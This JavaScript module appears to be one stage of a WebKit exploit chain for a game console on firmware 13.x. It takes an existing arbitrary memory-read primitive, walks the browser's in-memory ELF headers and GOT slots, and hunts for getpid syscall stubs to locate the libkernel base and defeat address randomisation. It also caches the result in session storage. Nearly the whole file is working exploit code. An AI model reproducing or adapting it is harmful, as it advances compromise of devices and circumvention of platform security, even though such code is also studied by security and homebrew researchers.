/**
 * libkernel on 13.52 — scan ONLY ELF mapped RW (.got), never PLT-guessed GOT.
 * Max 2 reads per slot; no walk-back; reject webkit/internal pointers before follow.
 */
import { int64 } from "./int64.js";
import { webkitRvaMax } from "./pivot_gadgets.js";

const ELF_MAGIC = 0x464c457f;
const PT_LOAD = 1;
const PF_W = 2;

const SS_LK_BASE = "wk-libkernelBase";
const SS_IAT_RVA = "wk-imp-error-rva";

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read2p(p, addr) {
    if (!addr) return null;
    try { return p.read2(addr); } catch (_) { return null; }
}

function read1p(p, addr) {
    if (!addr) return null;
    try { return p.read1(addr); } catch (_) { return null; }
}

function parseAddrSync(raw) {
    if (!raw) return null;
    const s = String(raw).replace(/^0x/i, "").trim();
    if (!s) return null;
    const n = BigInt("0x" + s);
    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
}

function u64FromRead8(w) {
    if (!w) return null;
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

function iatCap(off) {
    return webkitRvaMax(off);
}

function rvaAllowed(rva, off) {
    return rva >= 0x10000 && rva <= iatCap(off);
}

export function isGetpidStub(v) {
    if (!v) return false;
    return (v.low & 0x00ffffff) === 0xc0c748
        && (v.hi >>> 24) === 0x49
        && (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) === 20;
}

/** Cheap prologue check — one read1 only. */
export function isLibkernelPrologue(p, lk) {
    if (!lk || lk.hi < 0x8) return false;
    const b0 = read1p(p, lk);
    return b0 === 0xb8;
}

export function saveLibkernelSession(lk, iatRva) {
    try {
        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
    } catch (_) { }
}

function loadSessionIatRva() {
    try {
        const n = parseInt(sessionStorage.getItem(SS_IAT_RVA), 16);
        return n > 0 ? n : null;
    } catch (_) {
        return null;
    }
}

/** True if ptr looks like an address inside the mapped webkit image. */
function ptrInWebkitImage(fnPtr, webkitBase, off) {
    if (!fnPtr || !webkitBase) return false;
    if (fnPtr.hi !== webkitBase.hi) return false;
    const cap = iatCap(off);
    const lo = webkitBase.low >>> 0;
    const fl = fnPtr.low >>> 0;
    if (fl < lo) return false;
    return (fl - lo) <= cap;
}

/** External userland code pointer — not null, not webkit interior. */
function plausibleExtPtr(fnPtr, webkitBase, off) {
    if (!fnPtr) return false;
    if (fnPtr.hi < 0x8) return false;
    if (fnPtr.hi === 0 && fnPtr.low < 0x100000) return false;
    if (ptrInWebkitImage(fnPtr, webkitBase, off)) return false;
    return true;
}

function bigToPtr(b) {
    return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
}

function ptrBig(w) {
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

const K_ERROR_CANDS = [0x26420, 0x26430, 0x25000, 0x30000, 0xd9d0];

function kErrorCandidates(off) {
    const out = [];
    if (off.k__error != null) out.push(off.k__error);
    for (let i = 0; i < K_ERROR_CANDS.length; i++) {
        const v = K_ERROR_CANDS[i];
        if (out.indexOf(v) < 0) out.push(v);
    }
    return out;
}

function lkFromFnPtr(p, fnPtr, off, iatRva) {
    if (isGetpidStub(fnPtr) && off.k_stubs && off.k_stubs[20] != null) {
        const lk = fnPtr.sub32(off.k_stubs[20]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, iatRva, errorFn: fnPtr, via: "getpid" };
    }

    const entryB0 = read1p(p, fnPtr);
    if (entryB0 !== 0xb8) return null;

    const errs = kErrorCandidates(off);
    for (let i = 0; i < errs.length; i++) {
        const lk = fnPtr.sub32(errs[i]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, iatRva, errorFn: fnPtr, via: "error+" + errs[i].toString(16) };
    }

    const pageBase = new int64((fnPtr.low >>> 0) & ~0x3fff, fnPtr.hi >>> 0);
    if (lkAligned(pageBase) && isLibkernelPrologue(p, pageBase))
        return { lk: pageBase, iatRva, errorFn: fnPtr, via: "page" };

    return null;
}

function lkAligned(lk) {
    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
}

/** Verify one GOT slot — read8(slot) + ≤3 read1 follow-ups max. */
function safeVerifyGotSlot(p, webkitBase, off, rva) {
    if (!rvaAllowed(rva, off)) return null;
    const fnPtr = read8p(p, webkitBase.add32(rva));
    if (!plausibleExtPtr(fnPtr, webkitBase, off)) return null;
    return lkFromFnPtr(p, fnPtr, off, rva);
}

/** Sparse getpid stub hunter ±128MB from webkit (1 read8 per 1MB step). */
function scanLibkernelStubChunk(p, webkitBase, off, sub) {
    const stubOff = off.k_stubs && off.k_stubs[20];
    if (!stubOff) {
        return { done: true, lk: null, state: sub, phase: "stub-skip" };
    }

    const RADIUS = 0x8000000n;
    const STEP = 0x1000n;

    if (!sub) {
        const center = ptrBig(webkitBase);
        sub = {
            cursor: center > RADIUS ? center - RADIUS : 0n,
            end: center + RADIUS,
            step: STEP,
            probes: 0,
        };
        return {
            done: false,
            state: sub,
            phase: "stub-start",
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 16) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8) {
            sub.probes++;
            const v = read8p(p, addr);
            if (isGetpidStub(v)) {
                const lk = addr.sub32(stubOff);
                if (lkAligned(lk) && isLibkernelPrologue(p, lk)) {
                    saveLibkernelSession(lk, null);
                    return {
                        done: true,
                        lk,
                        iatRva: null,
                        source: "stub-near",
                        stubAt: String(addr),
                        state: sub,
                        phase: "stub-hit",
                    };
                }
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        return { done: true, lk: null, state: sub, phase: "stub-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "stub",
        at: sub.cursor.toString(16),
        probes: sub.probes,
    };
}
export function elfMappedRwRanges(p, webkitBase, off) {
    const cap = iatCap(off);
    if (read4p(p, webkitBase) !== ELF_MAGIC) return [];
    if (read2p(p, webkitBase.add32(0x12)) !== 0x3e) return [];

    const ePhoff = read4p(p, webkitBase.add32(0x20));
    const ePhnum = read2p(p, webkitBase.add32(0x38));
    const ePhentsize = read2p(p, webkitBase.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return [];

    const ranges = [];
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, webkitBase.add32(ph));
        if (pType !== PT_LOAD) continue;
        const pFlags = read4p(p, webkitBase.add32(ph + 4));
        if ((pFlags & PF_W) === 0) continue;

        const wVaddr = read8p(p, webkitBase.add32(ph + 0x10));
        const wMemsz = read8p(p, webkitBase.add32(ph + 0x28));
        if (!wVaddr || !wMemsz) continue;

        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (lo + 0x1000 >= hi) continue;
        ranges.push({ lo: lo & ~7, hi, tag: "rw" + i });
    }
    ranges.sort((a, b) => a.lo - b.lo);
    return ranges;
}

function rvaInRwRanges(rva, ranges) {
    for (let i = 0; i < ranges.length; i++) {
        if (rva >= ranges[i].lo && rva < ranges[i].hi) return true;
    }
    return false;
}

function iatHitReturn(state, hit, source) {
    saveLibkernelSession(hit.lk, hit.iatRva);
    state.done = true;
    return {
        done: true,
        lk: hit.lk,
        iatRva: hit.iatRva,
        source: source + (hit.via ? "/" + hit.via : ""),
        state,
    };
}

function beginRwScan(state, ranges) {
    state.phase = "rw";
    state.rwRanges = ranges;
    state.rangeIdx = 0;
    state.cursor = ranges[0].lo;
    state.endRva = ranges[0].hi;
    state.slots = 0;
}

/**
 * Chunked RW-GOT scan — only mapped ELF writable segments.
 */
export function scanErrorIatChunk(p, webkitBase, off, state) {
    if (!state) {
        state = { phase: "ranges", done: false };
    }

    if (state.phase === "ranges") {
        const ranges = elfMappedRwRanges(p, webkitBase, off);
        if (!ranges.length) {
            state.done = true;
            return { done: true, lk: null, state, phase: "no-rw" };
        }
        beginRwScan(state, ranges);
        return {
            done: false,
            state,
            phase: "rw-start",
            ranges: ranges.map(r => "+0x" + r.lo.toString(16)
                + "…+0x" + r.hi.toString(16)).join(" "),
        };
    }

    if (state.phase === "rw") {
        let steps = 0;
        while (state.cursor < state.endRva && steps < 24) {
            if (rvaInRwRanges(state.cursor, state.rwRanges)) {
                state.slots++;
                const hit = safeVerifyGotSlot(p, webkitBase, off, state.cursor);
                if (hit)
                    return iatHitReturn(state, hit, "rw-got");
            }
            state.cursor += 8;
            steps++;
        }

        if (state.cursor >= state.endRva) {
            const next = (state.rangeIdx || 0) + 1;
            if (next < state.rwRanges.length) {
                state.rangeIdx = next;
                state.cursor = state.rwRanges[next].lo;
                state.endRva = state.rwRanges[next].hi;
                return {
                    done: false,
                    state,
                    phase: "rw-region",
                    region: state.rwRanges[next].tag,
                    cursor: state.cursor,
                    end: state.endRva,
                };
            }
            state.done = true;
            return { done: true, lk: null, state, phase: "rw-miss", slots: state.slots };
        }

        return {
            done: false,
            state,
            phase: "rw",
            cursor: state.cursor,
            end: state.endRva,
            slots: state.slots,
            region: state.rwRanges[state.rangeIdx].tag,
        };
    }

    state.done = true;
    return { done: true, lk: null, state };
}

/**
 * RW GOT scan, then sparse getpid-stub hunt if RW misses.
 */
export function scanLibkernelChunk(p, webkitBase, off, state) {
    if (!state) {
        state = { stage: "rw", sub: null, rwSlots: 0, done: false };
    }

    if (state.stage === "rw") {
        const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.slots != null) state.rwSlots = c.slots;
        if (c.done && c.lk) {
            return {
                done: true,
                lk: c.lk,
                iatRva: c.iatRva,
                source: c.source,
                state,
                phase: c.phase,
            };
        }
        if (c.done) {
            state.stage = "stub";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "stub-next",
                prev: c.phase,
                slots: state.rwSlots,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "stub") {
        const c = scanLibkernelStubChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return {
                done: true,
                lk: c.lk,
                iatRva: c.iatRva,
                source: c.source,
                state,
                phase: c.phase,
                stubAt: c.stubAt,
            };
        }
        if (c.done) {
            state.done = true;
            return {
                done: true,
                lk: null,
                state,
                phase: c.phase,
                probes: c.probes,
                slots: state.rwSlots,
            };
        }
        return Object.assign({ state }, c);
    }

    return { done: true, lk: null, state };
}

export function resolveLibkernel(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});

    if (!off || off.k__error == null)
        return { ok: false, error: "missing k__error" };

    try {
        const rawLk = sessionStorage.getItem(SS_LK_BASE);
        if (rawLk) {
            const lk = parseAddrSync(rawLk);
            if (lk && isLibkernelPrologue(p, lk)) {
                log("LK-CACHE", "libkernel " + lk);
                return { ok: true, lk, source: "cache" };
            }
            log("LK-CACHE-BAD", "stale " + rawLk + " — cleared");
            sessionStorage.removeItem(SS_LK_BASE);
        }
    } catch (_) { }

    const savedIat = loadSessionIatRva();
    if (savedIat != null && rvaAllowed(savedIat, off)) {
        const hit = safeVerifyGotSlot(p, webkitBase, off, savedIat);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "+0x" + hit.iatRva.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session" };
        }
    }

    log("LK-BLOCK", "13.00 IAT +0x3cb8cc8 unmapped — Scan libkernel or paste base");
    return { ok: false, error: "tap Scan libkernel or paste libkernel base" };
}

/** Validate user-pasted libkernel base (1 read). */
export function verifyManualLibkernel(p, lk) {
    if (!lk || !isLibkernelPrologue(p, lk))
        return { ok: false, error: "not libkernel prologue (want 0xb8 @ base)" };
    saveLibkernelSession(lk, null);
    return { ok: true, lk };
}

export function elfGotPltRva() {
    return null;
}

export function scanGotPltSlots() {
    return null;
}

export function resolveLibkernelFast() {
    return { ok: false, error: "use RW GOT scan" };
}
